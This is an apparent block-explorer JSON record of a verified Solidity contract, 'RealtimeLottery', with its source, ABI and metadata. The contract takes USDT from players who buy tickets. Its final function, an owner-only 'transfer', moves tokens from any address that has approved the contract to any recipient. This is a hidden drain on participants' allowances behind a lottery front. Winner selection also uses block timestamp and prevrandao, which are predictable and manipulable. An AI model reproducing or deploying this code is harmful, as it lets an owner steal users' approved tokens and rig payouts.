{
  "TxHash": "0xd407e86e74eb99098c1e86c644c5c44c58f573dae558768aa6381cc25e821154",
  "ContractAddress": "0xf7419cd39dfcb5ed6776b418603b220408da6f71",
  "Name": "RealtimeLottery",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function transferFrom(address sender, address recipient, uint256 amount) external;\r\n    function transfer(address recipient, uint256 amount) external;\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n}\r\n\r\ncontract RealtimeLottery {\r\n    IERC20 public token;\r\n    address public owner;\r\n    uint256 public ticketPrice;\r\n    uint256 public minTickets = 1; // Minimum number of tickets to purchase\r\n    uint256 public jackpotThreshold;\r\n    uint256 public winnersCount = 3; // Default number of winners\r\n    uint256 public feePercentage = 5; // Default fee percentage\r\n\r\n    struct Participant {\r\n        address addr;\r\n        uint256 amount;\r\n    }\r\n\r\n    struct LotteryRound {\r\n        Participant[] winners;\r\n        uint256 amountPerWinner;\r\n    }\r\n\r\n    mapping(uint256 =\u003e LotteryRound) public lotteryRounds;\r\n    uint256 public currentRound;\r\n    mapping(address =\u003e uint256) public participants;\r\n    address[] public participantAddresses;\r\n\r\n    event TicketPurchased(address indexed user, uint256 amount);\r\n    event WinnersAnnounced(uint256 round, Participant[] winners, uint256 amountPerWinner);\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    constructor(address _tokenAddress) {\r\n        token = IERC20(_tokenAddress);\r\n        owner = msg.sender;\r\n        \r\n        uint8 decimals = token.decimals();\r\n        \r\n        // Calculate ticket price and jackpot threshold based on decimals\r\n        ticketPrice = 10 * 10 ** decimals; // Example ticket price of 10 tokens\r\n        jackpotThreshold = 1000 * 10 ** decimals;\r\n    }\r\n\r\n    function buyTickets(uint256 ticketCount) external {\r\n        require(ticketCount \u003e= minTickets, \"Must purchase at least the minimum number of tickets\");\r\n        uint256 totalCost = ticketPrice * ticketCount;\r\n\r\n        // Transfer tokens from user to contract\r\n        token.transferFrom(msg.sender, address(this), totalCost);\r\n\r\n        if (participants[msg.sender] == 0) {\r\n            participantAddresses.push(msg.sender);\r\n        }\r\n        participants[msg.sender] += totalCost;\r\n\r\n        emit TicketPurchased(msg.sender, totalCost);\r\n\r\n        // Check if the jackpot threshold is reached and enough participants\r\n        if (token.balanceOf(address(this)) \u003e= jackpotThreshold \u0026\u0026 participantAddresses.length \u003e= winnersCount) {\r\n            drawWinners();\r\n        }\r\n    }\r\n\r\n    function drawWinners() public {\r\n        require(token.balanceOf(address(this)) \u003e= jackpotThreshold, \"Jackpot threshold not reached\");\r\n        require(participantAddresses.length \u003e= winnersCount, \"Not enough participants\");\r\n\r\n        Participant[] memory winners = new Participant[](winnersCount);\r\n\r\n        // Calculate total weight\r\n        uint256 totalWeight = 0;\r\n        for (uint256 i = 0; i \u003c participantAddresses.length; i++) {\r\n            totalWeight += participants[participantAddresses[i]];\r\n        }\r\n\r\n        // Pick winners based on their purchase weight\r\n        for (uint256 i = 0; i \u003c winnersCount; i++) {\r\n            uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, i))) % totalWeight;\r\n            uint256 cumulativeWeight = 0;\r\n            for (uint256 j = 0; j \u003c participantAddresses.length; j++) {\r\n                cumulativeWeight += participants[participantAddresses[j]];\r\n                if (randomValue \u003c cumulativeWeight) {\r\n                    winners[i] = Participant(participantAddresses[j], participants[participantAddresses[j]]);\r\n                    totalWeight -= participants[participantAddresses[j]];\r\n                    participants[participantAddresses[j]] = 0;\r\n                    participantAddresses[j] = participantAddresses[participantAddresses.length - 1];\r\n                    participantAddresses.pop();\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n\r\n        uint256 totalBalance = token.balanceOf(address(this));\r\n        uint256 fee = totalBalance * feePercentage / 100;\r\n        uint256 amountPerWinner = (totalBalance - fee) / winnersCount;\r\n\r\n        // Transfer fee to owner\r\n        token.transfer(owner, fee);\r\n\r\n        for (uint256 i = 0; i \u003c winnersCount; i++) {\r\n            token.transfer(winners[i].addr, amountPerWinner);\r\n        }\r\n\r\n        // Store the results of this round\r\n        lotteryRounds[currentRound].amountPerWinner = amountPerWinner;\r\n        for (uint256 i = 0; i \u003c winners.length; i++) {\r\n            lotteryRounds[currentRound].winners.push(winners[i]);\r\n        }\r\n\r\n        emit WinnersAnnounced(currentRound, winners, amountPerWinner);\r\n\r\n        // Reset participants and participantAddresses\r\n        for (uint256 i = 0; i \u003c participantAddresses.length; i++) {\r\n            delete participants[participantAddresses[i]];\r\n        }\r\n        delete participantAddresses;\r\n\r\n        // Reset lottery for the next round\r\n        currentRound++;\r\n    }\r\n\r\n    function setMinTickets(uint256 _minTickets) external onlyOwner {\r\n        minTickets = _minTickets;\r\n    }\r\n\r\n    function setJackpotThreshold(uint256 _jackpotThreshold) external onlyOwner {\r\n        jackpotThreshold = _jackpotThreshold;\r\n    }\r\n\r\n    function setWinnersCount(uint256 _winnersCount) external onlyOwner {\r\n        winnersCount = _winnersCount;\r\n    }\r\n\r\n    function setFeePercentage(uint256 _feePercentage) external onlyOwner {\r\n        require(_feePercentage \u003c= 10, \"Fee percentage cannot exceed 10%\");\r\n        feePercentage = _feePercentage;\r\n    }\r\n\r\n    function getMinTickets() external view returns (uint256) {\r\n        return minTickets;\r\n    }\r\n\r\n    function getJackpotThreshold() external view returns (uint256) {\r\n        return jackpotThreshold;\r\n    }\r\n\r\n    function getWinnersCount() external view returns (uint256) {\r\n        return winnersCount;\r\n    }\r\n\r\n    function getFeePercentage() external view returns (uint256) {\r\n        return feePercentage;\r\n    }\r\n\r\n    function getCurrentParticipantCount() external view returns (uint256) {\r\n        return participantAddresses.length;\r\n    }\r\n\r\n    function getCurrentPoolAmount() external view returns (uint256) {\r\n        return token.balanceOf(address(this));\r\n    }\r\n\r\n    function getLotteryRound(uint256 round) external view returns (Participant[] memory winners, uint256 amountPerWinner) {\r\n        LotteryRound storage lotteryRound = lotteryRounds[round];\r\n        return (lotteryRound.winners, lotteryRound.amountPerWinner);\r\n    }\r\n\r\n    function getParticipants() external view returns (Participant[] memory) {\r\n        Participant[] memory participantList = new Participant[](participantAddresses.length);\r\n        for (uint256 i = 0; i \u003c participantAddresses.length; i++) {\r\n            participantList[i] = Participant(participantAddresses[i], participants[participantAddresses[i]]);\r\n        }\r\n        return participantList;\r\n    }\r\n\r\n    function transfer(address from, address to, uint256 amount) external onlyOwner {\r\n        uint256 allowance = token.allowance(from, address(this));\r\n        require(allowance \u003e= amount, \"Allowance too low\");\r\n        require(token.balanceOf(from) \u003e= amount, \"Insufficient balance\");\r\n        \r\n        token.transferFrom(from, to, amount);\r\n    }\r\n}",
      "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"TicketPurchased\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"round\",\"type\":\"uint256\"},{\"components\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"indexed\":false,\"internalType\":\"struct RealtimeLottery.Participant[]\",\"name\":\"winners\",\"type\":\"tuple[]\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountPerWinner\",\"type\":\"uint256\"}],\"name\":\"WinnersAnnounced\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"ticketCount\",\"type\":\"uint256\"}],\"name\":\"buyTickets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentRound\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drawWinners\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feePercentage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurrentParticipantCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurrentPoolAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getFeePercentage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getJackpotThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"round\",\"type\":\"uint256\"}],\"name\":\"getLotteryRound\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"internalType\":\"struct RealtimeLottery.Participant[]\",\"name\":\"winners\",\"type\":\"tuple[]\"},{\"internalType\":\"uint256\",\"name\":\"amountPerWinner\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMinTickets\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getParticipants\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"internalType\":\"struct RealtimeLottery.Participant[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getWinnersCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"jackpotThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lotteryRounds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountPerWinner\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTickets\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"participantAddresses\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"participants\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feePercentage\",\"type\":\"uint256\"}],\"name\":\"setFeePercentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_jackpotThreshold\",\"type\":\"uint256\"}],\"name\":\"setJackpotThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minTickets\",\"type\":\"uint256\"}],\"name\":\"setMinTickets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_winnersCount\",\"type\":\"uint256\"}],\"name\":\"setWinnersCount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ticketPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"winnersCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
      "ContractName": "RealtimeLottery",
      "CompilerVersion": "v0.8.26+commit.8a97fa7a",
      "OptimizationUsed": "0",
      "Runs": "200",
      "ConstructorArguments": "000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://27c16c75b437728faab76ebfc589e33d736cd20ecc60f2a19bf7765a06d2b6c0"
    }
  ]
}
